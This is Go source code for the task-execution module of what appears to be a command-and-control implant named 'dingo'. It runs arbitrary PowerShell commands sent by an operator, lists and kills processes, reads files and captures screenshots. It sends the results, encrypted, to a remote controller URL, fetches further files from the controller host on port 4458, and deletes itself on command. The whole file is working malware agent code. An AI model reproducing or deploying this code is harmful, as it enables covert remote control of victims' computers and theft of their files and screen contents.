package check

import (
	"bytes"
	"dingo/initialization"
	"dingo/tasks"
	"encoding/json"
	"fmt"
	"image/png"
	"net/http"
	"os"
	"path"
	"strings"
	"time"

	hg "github.com/deranged0tter/hellsgopher"
	selfdelete "github.com/secur30nly/go-self-delete"
	"github.com/vova616/screenshot"
)

var PWD, _ = hg.GetPwd()

func ExecTasks(tasksToDo []string, sleep *int, agentid string, useragent string, key []byte, beacon_name string, rhost string, url string) {
	for _, task := range tasksToDo {
		var data string

		taskSplit := strings.Split(task, " - ")
		task = taskSplit[0]
		taskData := taskSplit[1]

		fmt.Println(task)

		switch task {
		case "shell":
			data, _ = hg.PsReturn(taskData)
		case "whoami":
			data, _ = initialization.GetUsername()
		case "hostname":
			data, _ = hg.GetHostname()
		case "ps":
			data, _ = hg.PsReturn("tasklist")
		case "ifconfig":
			data, _ = hg.PsReturn("ipconfig")
		case "kill":
			pid := taskData
			hg.PsNoOut("Stop-Process -Id " + pid)
			data = fmt.Sprintf("killed process (%s)", pid)
		case "cat":
			data, _ = hg.PsReturn("type " + taskData)
		case "upload":
			taskDataSplit := strings.Split(taskData, " ")
			uFile := taskDataSplit[0]
			dPath := taskDataSplit[1]

			url := fmt.Sprintf("http://%s:4458/files/%s", rhost, uFile)

			err := hg.DownFile(url, dPath)
			if err != nil {
				data = err.Error()
				break
			}

			data = "successfully uploaded file"
		case "download":
			data = "successfully download file"
			data += " //SPLIT// "
			data += path.Base(taskData)
			data += " //END NAME// "
			fileData, _ := hg.ReadFileToString(taskData)
			data += fileData
		case "screenshot":
			img, err := screenshot.CaptureScreen()
			if err != nil {
				data = err.Error()
				break
			}

			file, err := os.Create("./temp.png")
			if err != nil {
				data = err.Error()
				break
			}

			err = png.Encode(file, img)
			if err != nil {
				data = err.Error()
				hg.DeleteFile("./temp.png")
				break
			}
			file.Close()

			filename := "ss_" + fmt.Sprintf("%d", time.Now().Unix()) + ".png"
			data = fmt.Sprintf("screenshot saved as (%s)", filename)
			data += " //SPLIT// "
			data += filename
			data += " //END NAME// "
			fileData, _ := hg.ReadFileToString("./temp.png")
			data += fileData

			hg.DeleteFile("./temp.png")
		case "pwd":
			data = PWD
		case "ls":
			data, _ = hg.PsReturn("dir " + taskData)
		case "cd":
			os.Chdir(taskData)
			data = fmt.Sprintf("changed directory to %s", taskData)
		default:
			data = "command not supported"
		}

		if !strings.Contains(data, " //SPLIT// ") {
			data += " //SPLIT// "
		}

		rawJsonData := tasks.HttpTaskPostRequest{
			Task: task,
			Data: data,
		}

		jsonData, _ := json.Marshal(rawJsonData)
		jsonDataEncrypted, _ := initialization.EncryptString(key, string(jsonData))

		client := &http.Client{}
		req, _ := http.NewRequest("POST", url, bytes.NewBuffer([]byte(jsonDataEncrypted)))

		req.Header.Add("AgentID", agentid)
		req.Header.Add("CallType", "Task")
		req.Header.Set("User-Agent", useragent)
		req.Header.Add("SLEEP", fmt.Sprint(*sleep))
		req.Header.Add("Name", beacon_name)

		client.Do(req)

		// kill self if die command used
		if data == "died" {
			selfdelete.SelfDeleteExe()
			os.Exit(2)
		}
	}
}
